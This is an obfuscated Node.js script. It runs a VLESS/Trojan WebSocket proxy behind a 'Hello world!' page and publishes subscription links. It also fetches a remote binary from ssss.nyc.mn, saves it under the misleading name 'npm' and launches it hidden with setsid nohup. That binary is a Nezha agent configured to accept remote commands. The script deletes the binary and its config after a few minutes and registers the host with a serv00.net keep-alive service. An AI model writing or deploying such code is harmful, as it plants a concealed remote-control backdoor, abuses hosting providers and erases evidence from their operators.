const _0x49d111=_0x3846;(function(_0x304d6f,_0x5cf695){const _0x1d67a9=_0x3846,_0x2af2f5=_0x304d6f();while(!![]){try{const _0x561581=-parseInt(_0x1d67a9(0x16b))/0x1+-parseInt(_0x1d67a9(0x143))/0x2*(parseInt(_0x1d67a9(0x153))/0x3)+parseInt(_0x1d67a9(0x15f))/0x4+parseInt(_0x1d67a9(0x17f))/0x5+parseInt(_0x1d67a9(0x131))/0x6*(parseInt(_0x1d67a9(0x149))/0x7)+parseInt(_0x1d67a9(0x142))/0x8*(-parseInt(_0x1d67a9(0x150))/0x9)+parseInt(_0x1d67a9(0x11a))/0xa;if(_0x561581===_0x5cf695)break;else _0x2af2f5['push'](_0x2af2f5['shift']());}catch(_0x529c1a){_0x2af2f5['push'](_0x2af2f5['shift']());}}}(_0x210e,0x51f85));const os=require('os'),http=require(_0x49d111(0x111)),fs=require('fs'),axios=require('axios'),net=require(_0x49d111(0x11b)),path=require(_0x49d111(0x185)),crypto=require(_0x49d111(0x129)),{Buffer}=require(_0x49d111(0x16f)),{exec,execSync}=require(_0x49d111(0x17e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x49d111(0x119)][_0x49d111(0x137)]||_0x49d111(0x186),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x49d111(0x166)]||'',NEZHA_KEY=process[_0x49d111(0x119)][_0x49d111(0x113)]||'',DOMAIN=process[_0x49d111(0x119)][_0x49d111(0x120)]||'1234.abc.com',AUTO_ACCESS=process[_0x49d111(0x119)][_0x49d111(0x15d)]||!![],WSPATH=process[_0x49d111(0x119)][_0x49d111(0x112)]||UUID[_0x49d111(0x11e)](0x0,0x8),SUB_PATH=process[_0x49d111(0x119)][_0x49d111(0x164)]||_0x49d111(0x180),NAME=process[_0x49d111(0x119)][_0x49d111(0x11c)]||'',PORT=process['env'][_0x49d111(0x17b)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x372315=_0x49d111;try{const _0x161a49=await axios[_0x372315(0x16c)]('https://api.ip.sb/geoip'),_0x277f40=_0x161a49[_0x372315(0x140)];ISP=(_0x277f40['country_code']+'-'+_0x277f40[_0x372315(0x141)])[_0x372315(0x14f)](/ /g,'_');}catch(_0x5dd055){ISP=_0x372315(0x184);}};GetISP();const httpServer=http[_0x49d111(0x134)]((_0x4a8674,_0x4bd883)=>{const _0x75ceac=_0x49d111;if(_0x4a8674['url']==='/'){const _0x5be3ab=path[_0x75ceac(0x11d)](__dirname,'index.html');fs[_0x75ceac(0x13e)](_0x5be3ab,_0x75ceac(0x167),(_0x442c28,_0x22132c)=>{const _0x1baabb=_0x75ceac;if(_0x442c28){_0x4bd883[_0x1baabb(0x10a)](0xc8,{'Content-Type':'text/html'}),_0x4bd883[_0x1baabb(0x106)](_0x1baabb(0x175));return;}_0x4bd883['writeHead'](0xc8,{'Content-Type':_0x1baabb(0x146)}),_0x4bd883[_0x1baabb(0x106)](_0x22132c);});return;}else{if(_0x4a8674['url']==='/'+SUB_PATH){const _0x5ab468=NAME?NAME+'-'+ISP:ISP,_0x48f2e1=_0x75ceac(0x178)+UUID+'@'+DOMAIN+_0x75ceac(0x16a)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x75ceac(0x182)+WSPATH+'#'+_0x5ab468,_0x3be63e=_0x75ceac(0x162)+UUID+'@'+DOMAIN+_0x75ceac(0x125)+DOMAIN+_0x75ceac(0x127)+DOMAIN+_0x75ceac(0x182)+WSPATH+'#'+_0x5ab468,_0x3d9b5c=_0x48f2e1+'\x0a'+_0x3be63e,_0x2fb5c7=Buffer[_0x75ceac(0x177)](_0x3d9b5c)[_0x75ceac(0x15c)](_0x75ceac(0x144));_0x4bd883['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x4bd883['end'](_0x2fb5c7+'\x0a');}else _0x4bd883[_0x75ceac(0x10a)](0x194,{'Content-Type':_0x75ceac(0x169)}),_0x4bd883[_0x75ceac(0x106)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x49d111(0x14f)](/-/g,''),DNS_SERVERS=[_0x49d111(0x151),_0x49d111(0x155)];function resolveHost(_0x34a2c5){return new Promise((_0x264bc0,_0x45ee88)=>{const _0x2252ea=_0x3846;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2252ea(0x12c)](_0x34a2c5)){_0x264bc0(_0x34a2c5);return;}let _0x240e23=0x0;function _0xee122f(){const _0x123807=_0x2252ea;if(_0x240e23>=DNS_SERVERS[_0x123807(0x16d)]){_0x45ee88(new Error(_0x123807(0x148)+_0x34a2c5+_0x123807(0x138)));return;}const _0x45172b=DNS_SERVERS[_0x240e23];_0x240e23++;const _0xe6c188=_0x123807(0x187)+encodeURIComponent(_0x34a2c5)+_0x123807(0x10f);axios[_0x123807(0x16c)](_0xe6c188,{'timeout':0x1388,'headers':{'Accept':_0x123807(0x154)}})['then'](_0x18c034=>{const _0x1271c9=_0x123807,_0x575c6f=_0x18c034[_0x1271c9(0x140)];if(_0x575c6f[_0x1271c9(0x10b)]===0x0&&_0x575c6f[_0x1271c9(0x15a)]&&_0x575c6f['Answer'][_0x1271c9(0x16d)]>0x0){const _0x11b841=_0x575c6f[_0x1271c9(0x15a)]['find'](_0x51fdae=>_0x51fdae[_0x1271c9(0x170)]===0x1);if(_0x11b841){_0x264bc0(_0x11b841['data']);return;}}_0xee122f();})[_0x123807(0x168)](_0x5918c6=>{_0xee122f();});}_0xee122f();});}function handleVlessConnection(_0x10d732,_0x599824){const _0x3f9864=_0x49d111,[_0x526bf7]=_0x599824,_0x16c960=_0x599824[_0x3f9864(0x11e)](0x1,0x11);if(!_0x16c960['every']((_0x5e7ee5,_0x496bc4)=>_0x5e7ee5==parseInt(uuid[_0x3f9864(0x108)](_0x496bc4*0x2,0x2),0x10)))return![];let _0x1ac901=_0x599824[_0x3f9864(0x11e)](0x11,0x12)[_0x3f9864(0x107)]()+0x13;const _0x2dbf05=_0x599824[_0x3f9864(0x11e)](_0x1ac901,_0x1ac901+=0x2)[_0x3f9864(0x17d)](0x0),_0x5ba7c1=_0x599824['slice'](_0x1ac901,_0x1ac901+=0x1)[_0x3f9864(0x107)](),_0x1bb81e=_0x5ba7c1==0x1?_0x599824[_0x3f9864(0x11e)](_0x1ac901,_0x1ac901+=0x4)[_0x3f9864(0x11d)]('.'):_0x5ba7c1==0x2?new TextDecoder()[_0x3f9864(0x110)](_0x599824[_0x3f9864(0x11e)](_0x1ac901+0x1,_0x1ac901+=0x1+_0x599824[_0x3f9864(0x11e)](_0x1ac901,_0x1ac901+0x1)[_0x3f9864(0x107)]())):_0x5ba7c1==0x3?_0x599824[_0x3f9864(0x11e)](_0x1ac901,_0x1ac901+=0x10)[_0x3f9864(0x15e)]((_0x41d77f,_0x32733b,_0x2e2631,_0x4d771f)=>_0x2e2631%0x2?_0x41d77f[_0x3f9864(0x158)](_0x4d771f['slice'](_0x2e2631-0x1,_0x2e2631+0x1)):_0x41d77f,[])[_0x3f9864(0x10c)](_0x53129e=>_0x53129e[_0x3f9864(0x17d)](0x0)['toString'](0x10))[_0x3f9864(0x11d)](':'):'';_0x10d732['send'](new Uint8Array([_0x526bf7,0x0]));const _0x2824a6=createWebSocketStream(_0x10d732);return resolveHost(_0x1bb81e)[_0x3f9864(0x159)](_0xf1c478=>{const _0x36a853=_0x3f9864;net[_0x36a853(0x11f)]({'host':_0xf1c478,'port':_0x2dbf05},function(){const _0x67aea7=_0x36a853;this[_0x67aea7(0x183)](_0x599824[_0x67aea7(0x11e)](_0x1ac901)),_0x2824a6['on'](_0x67aea7(0x126),()=>{})[_0x67aea7(0x17c)](this)['on'](_0x67aea7(0x126),()=>{})[_0x67aea7(0x17c)](_0x2824a6);})['on'](_0x36a853(0x126),()=>{});})[_0x3f9864(0x168)](_0x4b76df=>{const _0x3469a8=_0x3f9864;net['connect']({'host':_0x1bb81e,'port':_0x2dbf05},function(){const _0x308227=_0x3846;this['write'](_0x599824['slice'](_0x1ac901)),_0x2824a6['on']('error',()=>{})['pipe'](this)['on'](_0x308227(0x126),()=>{})[_0x308227(0x17c)](_0x2824a6);})['on'](_0x3469a8(0x126),()=>{});}),!![];}function handleTrojanConnection(_0x347289,_0x4a5c2b){const _0x26bba1=_0x49d111;try{if(_0x4a5c2b[_0x26bba1(0x16d)]<0x3a)return![];const _0x48b06e=_0x4a5c2b['slice'](0x0,0x38)[_0x26bba1(0x15c)](),_0x19cc5b=[UUID];let _0x429a47=null;for(const _0x1a2d8e of _0x19cc5b){const _0x31e20e=crypto[_0x26bba1(0x147)](_0x26bba1(0x132))['update'](_0x1a2d8e)[_0x26bba1(0x145)](_0x26bba1(0x165));if(_0x31e20e===_0x48b06e){_0x429a47=_0x1a2d8e;break;}}if(!_0x429a47)return![];let _0x2baa86=0x38;_0x4a5c2b[_0x2baa86]===0xd&&_0x4a5c2b[_0x2baa86+0x1]===0xa&&(_0x2baa86+=0x2);const _0x5af359=_0x4a5c2b[_0x2baa86];if(_0x5af359!==0x1)return![];_0x2baa86+=0x1;const _0x2d664e=_0x4a5c2b[_0x2baa86];_0x2baa86+=0x1;let _0x44f777,_0x1a68ee;if(_0x2d664e===0x1)_0x44f777=_0x4a5c2b[_0x26bba1(0x11e)](_0x2baa86,_0x2baa86+0x4)['join']('.'),_0x2baa86+=0x4;else{if(_0x2d664e===0x3){const _0xf2a650=_0x4a5c2b[_0x2baa86];_0x2baa86+=0x1,_0x44f777=_0x4a5c2b[_0x26bba1(0x11e)](_0x2baa86,_0x2baa86+_0xf2a650)['toString'](),_0x2baa86+=_0xf2a650;}else{if(_0x2d664e===0x4)_0x44f777=_0x4a5c2b[_0x26bba1(0x11e)](_0x2baa86,_0x2baa86+0x10)['reduce']((_0x563465,_0x53bae5,_0x35358d,_0x231bc9)=>_0x35358d%0x2?_0x563465[_0x26bba1(0x158)](_0x231bc9[_0x26bba1(0x11e)](_0x35358d-0x1,_0x35358d+0x1)):_0x563465,[])[_0x26bba1(0x10c)](_0x3d268b=>_0x3d268b[_0x26bba1(0x17d)](0x0)[_0x26bba1(0x15c)](0x10))[_0x26bba1(0x11d)](':'),_0x2baa86+=0x10;else return![];}}_0x1a68ee=_0x4a5c2b[_0x26bba1(0x17d)](_0x2baa86),_0x2baa86+=0x2;_0x2baa86<_0x4a5c2b[_0x26bba1(0x16d)]&&_0x4a5c2b[_0x2baa86]===0xd&&_0x4a5c2b[_0x2baa86+0x1]===0xa&&(_0x2baa86+=0x2);const _0x18bd98=createWebSocketStream(_0x347289);return resolveHost(_0x44f777)['then'](_0x105649=>{net['connect']({'host':_0x105649,'port':_0x1a68ee},function(){const _0x2a8319=_0x3846;_0x2baa86<_0x4a5c2b[_0x2a8319(0x16d)]&&this[_0x2a8319(0x183)](_0x4a5c2b[_0x2a8319(0x11e)](_0x2baa86)),_0x18bd98['on'](_0x2a8319(0x126),()=>{})[_0x2a8319(0x17c)](this)['on'](_0x2a8319(0x126),()=>{})['pipe'](_0x18bd98);})['on']('error',()=>{});})[_0x26bba1(0x168)](_0x1affcf=>{const _0x2a676c=_0x26bba1;net[_0x2a676c(0x11f)]({'host':_0x44f777,'port':_0x1a68ee},function(){const _0x153966=_0x2a676c;_0x2baa86<_0x4a5c2b[_0x153966(0x16d)]&&this[_0x153966(0x183)](_0x4a5c2b[_0x153966(0x11e)](_0x2baa86)),_0x18bd98['on']('error',()=>{})[_0x153966(0x17c)](this)['on'](_0x153966(0x126),()=>{})[_0x153966(0x17c)](_0x18bd98);})['on'](_0x2a676c(0x126),()=>{});}),!![];}catch(_0x5a2b73){return![];}}wss['on'](_0x49d111(0x10d),(_0x9a085a,_0x42e0ba)=>{const _0x2318ca=_0x49d111,_0x8b4848=_0x42e0ba[_0x2318ca(0x13d)]||'';_0x9a085a[_0x2318ca(0x135)](_0x2318ca(0x10e),_0x381052=>{const _0xef4e4b=_0x2318ca;if(_0x381052['length']>0x11&&_0x381052[0x0]===0x0){const _0x1cfb81=_0x381052[_0xef4e4b(0x11e)](0x1,0x11),_0x3ac1ac=_0x1cfb81[_0xef4e4b(0x139)]((_0x350fe7,_0x41389f)=>_0x350fe7==parseInt(uuid['substr'](_0x41389f*0x2,0x2),0x10));if(_0x3ac1ac){!handleVlessConnection(_0x9a085a,_0x381052)&&_0x9a085a[_0xef4e4b(0x136)]();return;}}!handleTrojanConnection(_0x9a085a,_0x381052)&&_0x9a085a[_0xef4e4b(0x136)]();})['on'](_0x2318ca(0x126),()=>{});});const getDownloadUrl=()=>{const _0x5c4c77=_0x49d111,_0xcbe71=os[_0x5c4c77(0x15b)]();return _0xcbe71==='arm'||_0xcbe71===_0x5c4c77(0x179)||_0xcbe71===_0x5c4c77(0x12f)?!NEZHA_PORT?_0x5c4c77(0x171):_0x5c4c77(0x12d):!NEZHA_PORT?_0x5c4c77(0x117):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3d3beb=_0x49d111;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x33ff5e=getDownloadUrl(),_0x304401=await axios({'method':_0x3d3beb(0x16c),'url':_0x33ff5e,'responseType':_0x3d3beb(0x114)}),_0xb12c3a=fs[_0x3d3beb(0x118)](_0x3d3beb(0x109));return _0x304401[_0x3d3beb(0x140)][_0x3d3beb(0x17c)](_0xb12c3a),new Promise((_0x51ee32,_0x215224)=>{const _0x40428d=_0x3d3beb;_0xb12c3a['on'](_0x40428d(0x156),()=>{const _0x5d744a=_0x40428d;console[_0x5d744a(0x123)](_0x5d744a(0x133)),exec(_0x5d744a(0x163),_0x24fb0c=>{if(_0x24fb0c)_0x215224(_0x24fb0c);_0x51ee32();});}),_0xb12c3a['on'](_0x40428d(0x126),_0x215224);});}catch(_0x3120d1){throw _0x3120d1;}},runnz=async()=>{const _0xc29321=_0x49d111;try{const _0x3ea71c=execSync(_0xc29321(0x14c),{'encoding':_0xc29321(0x14d)});if(_0x3ea71c[_0xc29321(0x13a)]()!==''){console['log'](_0xc29321(0x14b));return;}}catch(_0x3b4360){}await downloadFile();let _0x29586f='',_0x5e302e=['443','8443',_0xc29321(0x181),_0xc29321(0x122),_0xc29321(0x124),_0xc29321(0x115)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3816ff=_0x5e302e[_0xc29321(0x12a)](NEZHA_PORT)?'--tls':'';_0x29586f=_0xc29321(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0xc29321(0x13c)+NEZHA_KEY+'\x20'+_0x3816ff+_0xc29321(0x116);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x41dcbf=NEZHA_SERVER[_0xc29321(0x12a)](':')?NEZHA_SERVER[_0xc29321(0x174)](':')['pop']():'',_0xb719a1=_0x5e302e[_0xc29321(0x12a)](_0x41dcbf)?'true':_0xc29321(0x176),_0x2ea0b6='client_secret:\x20'+NEZHA_KEY+_0xc29321(0x13b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xb719a1+_0xc29321(0x16e)+UUID;fs[_0xc29321(0x121)](_0xc29321(0x12e),_0x2ea0b6);}_0x29586f=_0xc29321(0x13f);}else{console[_0xc29321(0x123)](_0xc29321(0x172));return;}}try{exec(_0x29586f,{'shell':_0xc29321(0x17a)},_0x1501c1=>{const _0x2955c2=_0xc29321;if(_0x1501c1)console[_0x2955c2(0x126)](_0x2955c2(0x188),_0x1501c1);else console[_0x2955c2(0x123)](_0x2955c2(0x14e));});}catch(_0x3ba76f){console['error'](_0xc29321(0x189)+_0x3ba76f);}};async function addAccessTask(){const _0x44ebfc=_0x49d111;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x419078=_0x44ebfc(0x152)+DOMAIN;try{const _0x1c8000=await axios[_0x44ebfc(0x128)](_0x44ebfc(0x130),{'url':_0x419078},{'headers':{'Content-Type':_0x44ebfc(0x160)}});console[_0x44ebfc(0x123)](_0x44ebfc(0x157));}catch(_0x97959a){}}function _0x210e(){const _0x4ba28d=['text/html','createHash','Failed\x20to\x20resolve\x20','13251KEHNwo','listen','npm\x20is\x20already\x20running,\x20skip\x20running...','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','utf-8','npm\x20is\x20running','replace','19341PkaHSo','8.8.4.4','https://','6pNOeWG','application/dns-json','1.1.1.1','finish','Automatic\x20Access\x20Task\x20added\x20successfully','concat','then','Answer','arch','toString','AUTO_ACCESS','reduce','891680zulRjr','application/json','unlink','trojan://','chmod\x20+x\x20npm','SUB_PATH','hex','NEZHA_PORT','utf8','catch','text/plain',':443?encryption=none&security=tls&sni=','90337vOJmPA','get','length','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','buffer','type','https://arm64.ssss.nyc.mn/v1','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','setsid\x20nohup\x20./npm\x20-s\x20','split','Hello\x20world!','false','from','vless://','arm64','/bin/bash','PORT','pipe','readUInt16BE','child_process','1379255XLOYQu','forever','2096','&path=%2F','write','Unknown','path','5efabea4-f6d4-91fd-b8f0-17e004c89c60','https://dns.google/resolve?name=','npm\x20running\x20error:','error:\x20','end','readUInt8','substr','npm','writeHead','Status','map','connection','message','&type=A','decode','http','WSPATH','NEZHA_KEY','stream','2053','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','createWriteStream','env','161170lATQLw','net','NAME','join','slice','connect','DOMAIN','writeFileSync','2087','log','2083',':443?security=tls&sni=','error','&fp=chrome&type=ws&host=','post','crypto','includes','Server\x20is\x20running\x20on\x20port\x20','test','https://arm64.ssss.nyc.mn/agent','config.yaml','aarch64','https://oooo.serv00.net/add-url','414MenCpc','sha224','npm\x20download\x20successfully','createServer','once','close','UUID','\x20with\x20all\x20DNS\x20servers','every','trim','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20-p\x20','url','readFile','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','data','isp','24YsLpPS','212972sVQXQP','base64','digest'];_0x210e=function(){return _0x4ba28d;};return _0x210e();}function _0x3846(_0x31157e,_0x147cd8){_0x31157e=_0x31157e-0x106;const _0x210e38=_0x210e();let _0x38469d=_0x210e38[_0x31157e];return _0x38469d;}const delFiles=()=>{const _0x339180=_0x49d111;fs[_0x339180(0x161)](_0x339180(0x109),()=>{}),fs['unlink'](_0x339180(0x12e),()=>{});};httpServer[_0x49d111(0x14a)](PORT,()=>{const _0x520f4c=_0x49d111;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x520f4c(0x123)](_0x520f4c(0x12b)+PORT);});
